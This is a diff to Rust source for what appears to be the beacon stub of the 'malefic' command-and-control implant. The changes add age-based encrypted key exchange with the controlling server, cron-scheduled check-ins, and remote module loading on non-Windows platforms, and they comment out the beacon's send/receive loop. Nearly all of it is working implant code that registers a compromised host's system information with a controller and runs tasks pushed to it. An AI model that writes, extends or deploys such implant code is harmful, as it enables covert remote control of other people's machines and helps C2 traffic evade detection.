@@ -1,6 +1,6 @@
 use anyhow::anyhow;
 use futures::SinkExt;
-use futures::StreamExt;
+// use futures::StreamExt;
 use futures_timer::Delay;
 use lazy_static::lazy_static;
 use std::str::FromStr;
@@ -12,11 +12,12 @@ use malefic_core::common::error::MaleficError;
 use malefic_core::manager::internal::InternalModule;
 use malefic_core::manager::manager::MaleficManager;
 use malefic_core::scheduler::TaskOperator;
-use malefic_core::transport::{Client, InnterTransport};
+// use malefic_core::transport::{Client, InnterTransport};
 use malefic_core::{check_body, config};
 use malefic_helper::debug;
 use malefic_proto::proto::{modulepb, implantpb, implantpb::{Spite, Spites}, implantpb::spite::Body};
-use malefic_proto::{marshal, new_error_spite, new_spite};
+// use malefic_proto::{marshal, new_empty_spite, new_error_spite, new_spite};
+use malefic_proto::{new_empty_spite, new_error_spite, new_spite};
 
 
 
@@ -46,80 +47,109 @@ impl MaleficStub {
         }
     }
 
+    pub fn get_sysinfo(&self) -> malefic_helper::common::sysinfo::SysInfo {
+        malefic_helper::common::sysinfo::get_sysinfo()
+    }
+
     pub fn register_spite(&mut self) -> Spite {
         let sysinfo = malefic_core::common::sys::get_register_info();
         debug!("sysinfo: {:#?}", sysinfo);
+
+        let secure = {
+            #[cfg(feature = "secure")]
+            {
+                if let Some(public_key) = self.meta.get_encrypt_key(){
+                    Some(modulepb::Secure {
+                        enable: true,
+                        key: String::new(), // 预留加密密钥字段
+                        r#type: "age".to_string(),
+                        public_key: public_key.to_string(),
+                    })
+                } else {
+                    None
+                }
+            }
+            #[cfg(not(feature = "secure"))]
+            {
+                None
+            }
+        };
 
         new_spite(
             0,
             "register".to_string(),
             Body::Register(modulepb::Register {
                 name: config::NAME.to_string(),
-                proxy: config::PROXY.to_string(),
+                proxy: config::PROXY_URL.to_string(),
                 module: self.manager.list_module(InternalModule::all()),
                 addons: self.manager.list_addon(),
                 sysinfo,
                 timer: Some(modulepb::Timer {
-                    interval: config::INTERVAL.clone(),
+                    expression: config::CRON.to_string(), // cron表达式控制调度
                     jitter: config::JITTER.clone() as f64,
                 }),
+                secure,
             }),
         )
     }
 
-    async fn push(&mut self, spite: Spite) -> anyhow::Result<()> {
+    pub async fn push(&mut self, spite: Spite) -> anyhow::Result<()> {
         self.channel.data_sender.send(spite).await?;
         Ok(())
     }
 
-    pub async fn process_data(
-        &mut self,
-        transport: InnterTransport,
-        client: &mut Client,
-    ) -> Result<(), anyhow::Error> {
-        self.channel.request_sender.send(true).await?;
-
-        let spites = if let Some(data) = self.channel.response_receiver.next().await {
-            data
-        } else {
-            EMPTY_SPITES.clone()
-        };
-
-        #[cfg(debug_assertions)]
-        {
-            if malefic_proto::get_message_len(&spites) <= 2048 {
-                println!("{:#?}", spites);
-            } else {
-                println!("length: {}", spites.spites.len());
-            }
-        }
-        let marshaled = marshal(self.meta.get_uuid(), spites.clone())?;
-        if let Ok(res) = client.handler(transport, marshaled).await {
-            match res {
-                Some(spite_data) => {
-                    let spites = spite_data.parse()?;
-                    self.handler(spites).await?;
-                }
-                None => {
-                    debug!("[beacon] no recv");
-                }
-            }
-        } else {
-            debug!("[beacon] send error, recover spites");
-            for spite in spites.spites {
-                self.push(spite).await?;
-            }
-        }
-
-        Ok(())
-    }
+    // pub async fn process_data(
+    //     &mut self,
+    //     transport: InnterTransport,
+    //     client: &mut Client,
+    // ) -> Result<(), anyhow::Error> {
+    //     self.channel.request_sender.send(true).await?;
+    //
+    //     let spites = if let Some(data) = self.channel.response_receiver.next().await {
+    //         data
+    //     } else {
+    //         EMPTY_SPITES.clone()
+    //     };
+    //
+    //     #[cfg(debug_assertions)]
+    //     {
+    //         if malefic_proto::get_message_len(&spites) <= 2048 {
+    //             println!("{:#?}", spites);
+    //         } else {
+    //             println!("length: {}", spites.spites.len());
+    //         }
+    //     }
+    //     // Marshal with optional encryption
+    //     let marshaled = marshal(self.meta.get_uuid(), spites.clone(), self.meta.get_encrypt_key())?;
+    //
+    //     if let Ok(res) = client.handler(transport, marshaled).await {
+    //         match res {
+    //             Some(spite_data) => {
+    //                 // Parse with optional decryption
+    //                 let private_key = self.meta.get_decrypt_key();
+    //                 let spites = spite_data.parse(private_key)?;
+    //                 self.handler(spites).await?;
+    //             }
+    //             None => {
+    //                 debug!("[beacon] no recv");
+    //             }
+    //         }
+    //     } else {
+    //         debug!("[beacon] send error, recover spites");
+    //         for spite in spites.spites {
+    //             self.push(spite).await?;
+    //         }
+    //     }
+    //
+    //     Ok(())
+    // }
 
     pub async fn handler(&mut self, spites: Spites) -> anyhow::Result<()> {
         for spite in spites.spites {
             #[cfg(debug_assertions)]
             {
                 if malefic_proto::get_message_len(&spite) <= 2048 {
-                    println!("{:#?}", spite);
+                    println!("Spite({})==> {:#?}",malefic_proto::get_message_len(&spite), spite);
                 } else {
                     println!("taskid: {} {}", spite.task_id, spite.name);
                 }
@@ -186,7 +216,6 @@ impl MaleficStub {
                 );
                 self.push(result).await?;
             }
-            #[cfg(target_os = "windows")]
             Ok(InternalModule::LoadModule) => {
                 let modules = self.manager.load_module(req.clone())?;
                 self.push(new_spite(
@@ -197,10 +226,6 @@ impl MaleficStub {
                     }),
                 ))
                 .await?;
-            }
-            #[cfg(not(target_os = "windows"))]
-            Ok(InternalModule::LoadModule) => {
-                return Err(anyhow::anyhow!("LoadModule is only supported on Windows"));
             }
             Ok(InternalModule::LoadAddon) => {
                 self.manager.load_addon(req.clone())?;
@@ -275,7 +300,7 @@ impl MaleficStub {
             }
             Ok(InternalModule::Sleep) => {
                 let sleep = check_body!(req, Body::SleepRequest)?;
-                self.meta.update(sleep.interval, sleep.jitter);
+                self.meta.update_schedule(&*sleep.expression, sleep.jitter)?;
                 self.push(new_spite(
                     req.task_id,
                     InternalModule::Sleep.to_string(),
@@ -290,7 +315,7 @@ impl MaleficStub {
                     Body::Empty(implantpb::Empty::default()),
                 ))
                 .await?;
-                Delay::new(Duration::from_secs(self.meta.interval * 2)).await;
+                Delay::new(Duration::from_secs(10)).await;
                 std::process::exit(0);
             }
             Ok(InternalModule::Switch) => {
@@ -303,7 +328,14 @@ impl MaleficStub {
                 ))
                 .await?
             }
+            Ok(InternalModule::KeyExchange) => {
+                let key_request = check_body!(req, Body::KeyExchangeRequest)?;
+                let key_resp = self.handle_key_exchange(req.task_id, key_request).await?;
+                self.push(key_resp).await?;
+            }
             Err(_) => {
+                debug!("req {:}",req.name);
+                debug!("{:?}",req.body);
                 let body = req.body.ok_or_else(|| anyhow!(MaleficError::MissBody))?;
                 let module = self
                     .manager
@@ -316,5 +348,30 @@ impl MaleficStub {
             }
         };
         Ok(())
+    }
+
+    async fn handle_key_exchange(&mut self, task_id: u32, _key_request: modulepb::KeyExchangeRequest) -> anyhow::Result<Spite> {
+        #[cfg(feature = "secure")]
+        {
+            let (private_key, public_key)  = malefic_proto::generate_age_keypair();
+
+            // 如果request中包含server的公钥，保存到meta
+            if !key_request.public_key.is_empty() {
+                self.meta.server_public_key = key_request.public_key;
+            }
+
+            self.meta.private_key = private_key;
+            Ok(new_spite(
+                task_id,
+                "key_exchange".to_string(),
+                Body::KeyExchangeResponse(modulepb::KeyExchangeResponse {
+                    public_key,
+                }),
+            ))
+        }
+        #[cfg(not(feature = "secure"))]
+        {
+            Ok(new_empty_spite(task_id, "key_ack".to_string()))
+        }
     }
 }
